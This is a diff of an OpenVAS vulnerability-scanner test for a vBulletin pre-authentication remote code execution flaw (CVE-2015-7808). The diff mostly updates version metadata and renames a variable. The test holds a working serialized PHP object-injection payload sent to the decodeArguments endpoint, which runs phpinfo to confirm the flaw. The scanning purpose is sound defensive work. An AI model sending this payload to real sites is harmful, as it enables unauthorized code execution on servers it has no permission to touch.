@@ -1,6 +1,5 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_vbulletin_rce_11_15.nasl 6470 2017-06-28 15:19:44Z cfischer $
 #
 # vBulletin PreAuth Remote Code Execution
 #
@@ -30,11 +29,11 @@ CPE = "cpe:/a:vbulletin:vbulletin";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.105447");
-  script_version("$Revision: 6470 $");
+  script_version("2019-07-26T13:41:14+0000");
   script_cve_id("CVE-2015-7808");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-06-28 17:19:44 +0200 (Wed, 28 Jun 2017) $");
+  script_tag(name:"last_modification", value:"2019-07-26 13:41:14 +0000 (Fri, 26 Jul 2019)");
   script_tag(name:"creation_date", value:"2015-11-10 18:30:30 +0100 (Tue, 10 Nov 2015)");
   script_name("vBulletin PreAuth Remote Code Execution");
   script_category(ACT_ATTACK);
@@ -78,12 +77,12 @@ foreach db( make_list( "vB_Database_MySQLi", "vB_Database" ) ) {
   cmd = 'phpinfo';
   cmd_len = strlen( cmd );
 
-  ser = 'O:12:"vB_dB_Result":2:{s:5:"*db";O:' + db_len  + ':"' + db  + '":1:{s:9:"functions";a:1:{s:11:"free_result";s:' + cmd_len  + ':"' + cmd + '";}}s:12:"*recordset";i:1;}';
+  exp = 'O:12:"vB_dB_Result":2:{s:5:"*db";O:' + db_len  + ':"' + db  + '":1:{s:9:"functions";a:1:{s:11:"free_result";s:' + cmd_len  + ':"' + cmd + '";}}s:12:"*recordset";i:1;}';
 
-  ser = urlencode( str:ser );
-  ser = str_replace( string:ser, find:'*', replace:'%00%2a%00' );
+  exp = urlencode( str:exp );
+  exp = str_replace( string:exp, find:'*', replace:'%00%2a%00' );
 
-  url = dir + '/ajax/api/hook/decodeArguments?arguments=' + ser;
+  url = dir + '/ajax/api/hook/decodeArguments?arguments=' + exp;
 
   if( http_vuln_check( port:port, url:url, pattern:'<title>phpinfo\\(\\)</title>' ) ) {
     report = report_vuln_url( port:port, url:url );
